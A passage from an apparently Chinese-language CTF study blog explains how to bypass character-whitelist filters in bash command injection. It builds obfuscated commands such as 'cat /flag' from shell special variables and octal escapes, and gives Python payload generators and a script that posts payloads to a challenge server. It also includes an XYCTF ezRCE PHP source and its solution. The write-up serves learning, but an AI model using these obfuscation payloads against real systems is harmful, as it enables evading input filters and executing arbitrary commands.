-<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
-<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
-<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
-<p><strong>那现在就继续跟文章</strong></p>
-<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
-<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
-<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
-<p>最终构造地paylaod：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>
-
-<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
-<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
-<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
-<table>
-<thead>
-<tr>
-<th>变量名</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$0</td>
-<td>脚本本身的名字</td>
-</tr>
-<tr>
-<td>$1</td>
-<td>脚本后所输入的第一串字符</td>
-</tr>
-<tr>
-<td>$2</td>
-<td>传递给该shell脚本的第二个参数</td>
-</tr>
-<tr>
-<td>$*</td>
-<td>脚本后所输入的所有字符</td>
-</tr>
-<tr>
-<td>$@</td>
-<td>脚本后所输入的所有字符</td>
-</tr>
-<tr>
-<td>$_</td>
-<td>表示上一个命令的最后一个参数</td>
-</tr>
-<tr>
-<td>$#</td>
-<td>#脚本后所输入的字符串个数</td>
-</tr>
-<tr>
-<td>$$</td>
-<td>脚本运行的当前进程ID号</td>
-</tr>
-<tr>
-<td>$!</td>
-<td>表示最后执行的后台命令的PID</td>
-</tr>
-<tr>
-<td>$?</td>
-<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
-</tr>
-</tbody></table>
-<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
-<p>加了变量$__作为过渡，减少了解析的过程。</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>可以使用的脚本:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
-<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>再传入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
-<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
-<p>解决方法同样使用两次bash，先试试，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
-<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
-<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
-<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
-<p>最终<code>ls</code>的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
-<p>成功执行，其他的payload构造也是同理。</p>
-<p>官方wp给了脚本（偷个懒），如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
-<p>payload如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>自增需要抓包后url编码传参</strong></p>
-<p>可以使用脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
-<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><strong>自增运算时传参需要url编码一下。</strong></p>
-<p>利用脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
-
-<p>自增等后面再来研究</p>
-<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
-
-<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
-<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
-<p>最后读flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>读到flag</p>
